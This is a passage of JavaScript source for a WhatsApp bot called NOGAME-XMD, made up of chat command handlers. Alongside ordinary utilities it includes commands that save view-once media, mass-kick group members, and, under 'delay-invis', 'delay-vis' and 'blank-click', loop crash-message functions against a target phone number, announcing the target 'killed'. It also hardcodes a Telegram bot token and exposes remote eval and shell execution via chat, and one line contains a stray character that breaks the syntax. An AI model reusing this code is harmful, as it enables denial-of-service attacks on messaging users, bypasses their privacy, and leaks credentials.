                    serverMessageId: 143
                }
            }
        },
        { quoted: qtext2 }
    );
    break;
}


case 'readviewonce': case 'vv': {
    try {
        if (!m.quoted) return replyphistar('❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴠɪᴇᴡᴏɴᴄᴇ ᴠɪᴅᴇᴏ, ɪᴍᴀɢᴇ, ᴏʀ ᴀᴜᴅɪᴏ.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replyphistar('❌ ɴᴏ ᴍᴇᴅɪᴀ ғᴏᴜɴᴅ ɪɴ ᴛʜᴇ ǫᴜᴏᴛᴇᴅ ᴍᴇssᴀɢᴇ.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await PhistarBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await PhistarBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await PhistarBotInc.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv command:', error);
        replyphistar('❌ An error occurred while processing your request.');
    }
    break;
}
case 'readviewonce2':
case 'vv2':
case 'save': {
    try {
        if (!m.quoted) return replyphistar('❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴠɪᴇᴡᴏɴᴄᴇ ᴠɪᴅᴇᴏ, ɪᴍᴀɢᴇ, ᴏʀ ᴀᴜᴅɪᴏ.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replyphistar('❌ ɴᴏ ᴍᴇᴅɪᴀ ғᴏᴜɴᴅ ɪɴ ᴛʜᴇ ǫᴜᴏᴛᴇᴅ ᴍᴇssᴀɢᴇ.');q
        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await PhistarBotInc.sendMessage(m.sender, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await PhistarBotInc.sendMessage(m.sender, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await PhistarBotInc.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await PhistarBotInc.sendMessage(m.sender, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv2/save command:', error);
        replyphistar('❌ Error saving media.');
    }
    break;
}


// ================= REMINI ================= //
case 'remini':
case 'enhance':
case 'hd':
case 'upscale': {
    try {
        const quotedMsg = quoted || m;
        const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';

        if (!mimeType || !mimeType.startsWith('image/')) {
            return replyphistar("📸 ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀɴ *ɪᴍᴀɢᴇ* (ᴊᴘᴇɢ/ᴘɴɢ).");
        }

        // Download media buffer
        const mediaBuffer = await quotedMsg.download?.() || null;
        if (!mediaBuffer) return replyphistar("❌ Failed to download image.");

        // File extension
        let extension = mimeType.includes("jpeg") ? ".jpg" : 
                        mimeType.includes("png") ? ".png" : null;
        if (!extension) return replyphistar("❌ ᴜɴsᴜᴘᴘᴏʀᴛᴇᴅ ғᴏʀᴍᴀᴛ. ᴜsᴇ ᴊᴘᴇɢ/ᴘɴɢ ᴏɴʟʏ.");

        // Save to temp
        const inputPath = path.join(os.tmpdir(), `remini_in_${Date.now()}${extension}`);
        fs.writeFileSync(inputPath, mediaBuffer);

        // Notify user
        await replyphistar("🔄 ᴇɴʜᴀɴᴄɪɴɢ ɪᴍᴀɢᴇ ǫᴜᴀʟɪᴛʏ... ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ⏳");

        // Upload to Catbox
        const form = new FormData();
        form.append('fileToUpload', fs.createReadStream(inputPath), `image${extension}`);
        form.append('reqtype', 'fileupload');

        const { data: imageUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
            headers: form.getHeaders(),
            timeout: 30000
        });
        fs.existsSync(inputPath) && fs.unlinkSync(inputPath);

        if (!imageUrl || !imageUrl.startsWith("http")) {
            return replyphistar("❌ Failed to upload image.");
        }

        // Call Enhance API
        const { data: enhanced } = await axios.get(
            `https://www.veloria.my.id/imagecreator/upscale?url=${encodeURIComponent(imageUrl)}`,
            { responseType: "arraybuffer", timeout: 60000 }
        );

        if (!enhanced || enhanced.length < 200) {
            return replyphistar("❌ API returned invalid image data.");
        }

        // Save enhanced image
        const outputPath = path.join(os.tmpdir(), `remini_out_${Date.now()}.jpg`);
        fs.writeFileSync(outputPath, enhanced);

        // Send result
        await PhistarBotInc.sendMessage(m.chat, {
            image: fs.readFileSync(outputPath),
            caption: "*✅ ɪᴍᴀɢᴇ ᴇɴʜᴀɴᴄᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!*\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝐍𝐎𝐆𝐀𝐌𝐄 𝐓𝐄𝐂𝐇"
        }, { quoted: qtext2 });

        fs.existsSync(outputPath) && fs.unlinkSync(outputPath);

    } catch (error) {
        console.error("Image Enhancement Error:", error);
        replyphistar(`❌ Error: ${error.message || "Enhancement failed. Try again later."}`);
    }
}
break;

case 'kickall':
case 'removeall':
case 'cleargroup': {
    if (!m.isGroup) return replyphistar("❌ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜsᴇᴅ ɪɴ ɢʀᴏᴜᴘs!");
        if (!isAdmins && !isCreator) return replyphistar('Restricted ᴛᴏ ᴀᴅᴍɪɴs ᴀɴᴅ ᴄʀᴇᴀᴛᴏʀs');

    try {
        const groupMetadata = await PhistarBotInc.groupMetadata(from);
        const botJid = PhistarBotInc.user?.id || PhistarBotInc.user?.jid;

        // Sauf bot & admins
        const membersToRemove = groupMetadata.participants
            .filter(p => p.admin === null && p.id !== botJid)
            .map(p => p.id);

        if (membersToRemove.length === 0) {
            return replyphistar("❌ ɴᴏ ᴍᴇᴍʙᴇʀs ᴛᴏ ʀᴇᴍᴏᴠᴇ (ᴀʟʟ ᴀʀᴇ ᴀᴅᴍɪɴs ᴏʀ ʙᴏᴛ).");
        }

        await replyphistar(`⚠️ *ᴡᴀʀɴɪɴɢ* ⚠️\n\nʀᴇᴍᴏᴠɪɴɢ *${membersToRemove.length}* ᴍᴇᴍʙᴇʀs ᴀᴛ ᴏɴᴄᴇ...`);

        // Retirer tous en une fois
        await PhistarBotInc.groupParticipantsUpdate(from, membersToRemove, "remove");

        await replyphistar(`✅ sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇᴍᴏᴠᴇᴅ *${membersToRemove.length}* ᴍᴇᴍʙᴇʀs.\n\n> *ᴇxᴇᴄᴜᴛᴇᴅ ʙʏ:* @${m.sender.split('@')[0]}`, {
            mentions: [m.sender]
        });

    } catch (error) {
        console.error("Kickall error:", error);
        replyphistar("❌ Failed to remove members. Possibly due to rate limits or permission issues.");
    }
}
break;
       

case 'alive': case 'test': {
    await PhistarBotInc.sendMessage(from, { react: { text: "⏱️", key: m.key } });
    
    let Menu3 = `
┏━━━━━━━━━━━━━━━┓
│ ʙᴏᴛ : *𝗡𝗢𝗚𝗔𝗠𝗘-𝗫𝗠𝗗*
│ ᴜᴘᴛɪᴍᴇ : ${runtime(process.uptime())}
│ sᴛᴀᴛᴜs : 🟢 ᴏɴʟɪɴᴇ
│ ᴠᴇʀsɪᴏɴ : *𝟷.𝟶.𝟶*
│ ᴅᴇᴠ : *𝐍𝐎𝐆𝐀𝐌𝐄 🇭🇹*
┣━━━━━━━━━━━━━━━┛
───────────────────
 𝗔𝗟𝗪𝗔𝗬𝗦 𝗔𝗖𝗧𝗜𝗩𝗘, 𝗧𝗔𝗞 𝗕𝗢𝗬 
───────────────────
© 𝐌𝐀𝐃𝐄 𝐁𝐘 𝐍𝐎𝐆𝐀𝐌𝐄 𝐓𝐄𝐂𝐇`;

    const imageUrl = "https://i.postimg.cc/cJVSsc0c/20251223-201318.jpg";

    await PhistarBotInc.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: Menu3,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363420981848394@newsletter',
                    newsletterName: '𝐍𝐎𝐆𝐀𝐌𝐄-𝐗𝐌𝐃',
                    serverMessageId: 143
                }
            }
        },
        { quoted: qtext2 }
    );
}
break;

        
   case 'runtime': case 'uptime': {
    let runtimetext = `*𝐍𝐎𝐆𝐀𝐌𝐄-𝐗𝐌𝐃 ALIVE 👋 ${runtime(process.uptime())}`;
    await PhistarBotInc.sendMessage(m.chat, {
        text: runtimetext,
        contextInfo: {
            forwardingScore: 2,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {  
                newsletterJid: "120363420981848394@newsletter",
                serverMessageId: Math.floor(Date.now() / 1000) + 2 // Dynamic ID
            }
        }
    }, { quoted: qtext2 });
}
break;    
      
     //unban
    case 'unban': 
    if (!isCreator) return replyphistar("🚨 ᴏɴʟʏ ᴛʜᴇ ʙᴏᴛ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.");

    if (!text) { 
        return replyphistar("🚨 ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴛʜᴇ ɴᴜᴍʙᴇʀ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴜɴʙᴀɴ. ᴜsᴀɢᴇ: ᴜɴʙᴀɴ <number>");
    }

    // Extract the target number
    let targetNumber = text.replace(/[^0-9]/g, ""); // Remove non-numeric characters

    if (targetNumber.startsWith("0") || targetNumber.length < 10) {
        return replyphistar("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ ɪɴᴄʟᴜᴅɪɴɢ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ.");
    }

    // Define the unban message
    const unbanMessage = `🚨 ʀᴇǫᴜᴇsᴛ ᴛᴏ ᴜɴʙᴀɴ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ: ${targetNumber}`;

    try {
        // Send the message to Telegram
        const telegramApiUrl = `https://api.telegram.org/bot7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M/sendMessage`;

        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: 6300694007, // Replace with your Telegram chat ID
                text: unbanMessage,
            }),
        });

        if (response.ok) {
            // Notify the sender that the request has been sent
            await replyphistar(`✅ ʏᴏᴜʀ ᴜɴʙᴀɴ ʀᴇǫᴜᴇsᴛ ʜᴀs ʙᴇᴇɴ* sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ! ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ ᴡɪʟʟ ʙᴇ ᴜɴʙᴀɴɴᴇᴅ ɪɴ ᴛʜᴇ ɴᴇxᴛ 10 ᴅᴀʏ. 🔄`);
        } else {
            const errorData = await response.json();
            console.error("Telegram API error:", errorData);
            await replyphistar("❌ Failed to process your unban request. Please try again later.");
        }
    } catch (error) {
        console.error("Error sending unban request:", error);
        await replyphistar("❌ An error occurred while processing your unban request. Please try again.");
    }
    break;
     
        
 case 'owner': {
const repf = await PhistarBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} ᴄᴏɴᴛᴀᴄᴛ`, 
contacts: list }, mentions: [sender] }, { quoted: qtext2 })
PhistarBotInc.sendMessage(from, { text : `> ᴡᴀɢ ᴡᴀɴ @${sender.split("@")[0]}, ᴍʏ  ʜᴀɴᴅsᴏᴍᴇ ᴏᴡɴᴇʀ ʙᴜᴛ ɪ ᴡᴀs ᴄʀᴇᴀᴛᴇᴅ ʙʏ 𝙽𝙾𝙶𝙰𝙼𝙴 𝚃𝙴𝙲𝙷,`, mentions: [sender]}, { quoted: qtext2 })
}
break     
        
   case 'fetch': case 'web': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} <api_or_download_link>`);

    try {
        // Notify the user that the bot is processing the request
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `📡`, key: m.key } });

        // Fetch the URL and handle file types
        const response = await axios.get(text, {
            responseType: 'arraybuffer', // Fetch data as a raw buffer
        });

        const contentType = response.headers['content-type'];
        const contentDisposition = response.headers['content-disposition'] || '';
        const extension = contentType.split('/')[1];

        // Generate a temporary filename if no filename is provided in the response headers
        const fs = require('fs');
        const path = require('path');
        const fileName = contentDisposition.match(/filename="([^"]+)"/)?.[1] || `tempfile.${extension}`;
        const tempFilePath = path.resolve(__dirname, fileName);
        fs.writeFileSync(tempFilePath, response.data);

        // Send the file to the user based on its content type
        if (contentType.startsWith('image/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: tempFilePath },
                caption: `*Fetched:* ${text}`,
            }, { quoted: m });
        } else if (contentType.startsWith('video/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: tempFilePath },
                mimetype: contentType,
                caption: `*Fetched:* ${text}`,
            }, { quoted: m });
        } else if (contentType.startsWith('audio/')) {
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: tempFilePath },
                mimetype: contentType,
                fileName: fileName,
                caption: `*Fetched:* ${text}`,
            }, { quoted: m });
        } else {
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: tempFilePath },
                mimetype: contentType,
                fileName: fileName,
                caption: `*Fetched:* ${text}`,
            }, { quoted: m });
        }

        // Cleanup: Delete the temporary file after sending
        fs.unlinkSync(tempFilePath);
    } catch (error) {
        console.error('Error in fetch command:', error.message);
        replyphistar(`*Failed to fetch the requested resource. Possible reasons:*
1. Invalid URL or download link
2. The server rejected the request
3. The file type isn't supported.

*Error Details:* ${error.message}`);
    }
    break;
}    
        
    case 'pair': case 'getbot': case 'freebot': case 'botclone': {
    const phoneNumber = args[0];
    const fixedPairCode = "𝐍𝐎𝐆𝐀𝐌𝐄"; // Fixed custom pairing code
    const sessionName = `session_${phoneNumber}`;

    if (!phoneNumber) {
        return replyphistar(
            `ℹ️ 𝚄𝚂𝙰𝙶𝙴: .pair <𝙿𝙷𝙾𝙽𝙴𝙽𝚄𝙼𝙱𝙴𝚁>\n` +
            `𝙴𝚇𝙰𝙼𝙿𝙻𝙴: .pair 55xxx\n` +
            `Replace 509xxx with 𝚈𝙾𝚄𝚁 𝙿𝙷𝙾𝙽𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 (WITHOUT +).\n` +
            `𝚃𝙷𝙴 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙲𝙾𝙳𝙴 𝚆𝙸𝙻𝙻 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴`
        );
    }

    if (!/^\d+$/.test(phoneNumber)) {
        return replyphistar(
            '⚠️ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙿𝙷𝙾𝙽𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝙵𝙾𝚁𝙼𝙰𝚃. ' +
            '𝚄𝚂𝙴 𝙽𝚄𝙼𝙱𝙴𝚁𝚂 𝙾𝙽𝙻𝚈 (e.g., 509xxx).'
        );
    }

    // Vérifier si la session existe déjà
    if (phistar_sessions.has(sessionName)) {
        const existingConn = phistar_sessions.get(sessionName).PhistarBotInc;
        if (existingConn && existingConn.user && existingConn.ws.isOpen) {
            return replyphistar(
                `⚠️ ${phoneNumber} is already connected. Use .delpair ${phoneNumber} to disconnect first.`
            );
        } else {
            phistar_sessions.delete(sessionName);
        }
    }

    replyphistar(
        `🔄 𝙸𝙽𝙸𝚃𝙸𝙰𝙻𝙸𝚉𝙸𝙽𝙶 𝚂𝙴𝚂𝚂𝙸𝙾𝙽 𝙵𝙾𝚁 ${phoneNumber} ` +
        `𝚆𝙸𝚃𝙷 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙲𝙾𝙳𝙴 ${fixedPairCode}...`
    );

    try {
        const PhistarBotInc = await PhistarBotIncStart(phoneNumber, from, fixedPairCode);

        // Sauvegarder dans phistar_sessions
        phistar_sessions.set(sessionName, { PhistarBotInc, owner: sender });

        replyphistar(
            `✅ 𝙸𝙽𝙸𝚃𝙸𝙰𝙻𝙸𝚉𝙴𝙳 ${phoneNumber} 𝙸𝙽 ` +
            `${PhistarBotInc.public ? 'public' : 'self'} 𝚖𝚘𝚍𝚎, ` +
            `Autostatusview: ${PhistarBotInc.autostatusview ? 'on' : 'off'}`
        );
    } catch (err) {
        console.error('Pair command error:', err);
        replyphistar(`❌ Failed to create session: ${err.message}`);
    }
}
break;


case 'delpair': {
    const phoneNumber = args[0];
    const sessionName = `session_${phoneNumber}`;

    if (!phoneNumber) {
        return replyphistar(`ℹ️ Usage: .delpair <PhoneNumber>`);
    }

    if (!phistar_sessions.has(sessionName)) {
        return replyphistar(`⚠️ No active session found for ${phoneNumber}`);
    }

    try {
        const sess = phistar_sessions.get(sessionName);
        if (sess.PhistarBotInc && sess.PhistarBotInc.ws.isOpen) {
            await sess.PhistarBotInc.ws.close();
        }

        phistar_sessions.delete(sessionName);
        replyphistar(`✅ Session for ${phoneNumber} deleted successfully.`);
    } catch (err) {
        console.error('Delpair error:', err);
        replyphistar(`❌ Failed to delete session: ${err.message}`);
    }
}
break;

case "delay-invis": {
if (!isAdmins && !isCreator) return replyphistar('Restricted ᴛᴏ ᴀᴅᴍɪɴs ᴀɴᴅ ᴄʀᴇᴀᴛᴏʀs');
if (!text) return replyphistar(`\`Example:\` : ${prefix+command} 509xxx`);
isTarget = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await PhistarBotInc.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await PhistarBotInc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© NOGAME CRASH WA`);

          for (let i = 0; i < 30; i++) {
          await delay1(isTarget)
          await InVisibleX(isTarget, ptcp = true)
          await CInVisible(isTarget, ptcp = true)
          await gsglx(isTarget)
          await glxFrcInvisible(PhistarBotInc, isTarget)
          await invisibleDozer(PhistarBotInc, isTarget)
          await galaxy(isTarget)
          await ExperimentDelay2(PhistarBotInc, isTarget, false)
            await sleep(1500);
        }

    }
  
break;

case "delay-vis": {
if (!isAdmins && !isCreator) return replyphistar('Restricted ᴛᴏ ᴀᴅᴍɪɴs ᴀɴᴅ ᴄʀᴇᴀᴛᴏʀs');
if (!text) return replyphistar(`\`Example:\` : ${prefix+command} 509xxx`);
isTarget = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await PhistarBotInc.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await PhistarBotInc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© NOGAME CRASH WA`);

          for (let i = 0; i < 30; i++) {
          await VisibleX(isTarget)
          await CVisible(isTarget)
          await delayJembut(PhistarBotInc, isTarget)
            await sleep(1500);
        }

    }
  
break; 

case "blank-click": {
if (!isAdmins && !isCreator) return replyphistar('Restricted ᴛᴏ ᴀᴅᴍɪɴs ᴀɴᴅ ᴄʀᴇᴀᴛᴏʀs');
if (!text) return replyphistar(`\`Example:\` : ${prefix+command} 509xxx`);
isTarget = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await PhistarBotInc.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await PhistarBotInc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© NOGAME CRASH WA`);

          for (let i = 0; i < 30; i++) {
          await spckfrz(PhistarBotInc, isTarget)
          await Blank2(PhistarBotInc, isTarget)
            await sleep(1500);
        }

    }
  
break;

    
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyphistar(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyphistar(bang)
                    }
                    try {
                        replyphistar(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyphistar(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyphistar(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyphistar(evaled)
                    } catch (err) {
                        await replyphistar(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyphistar(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyphistar(err)
                        if (stdout) return replyphistar(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
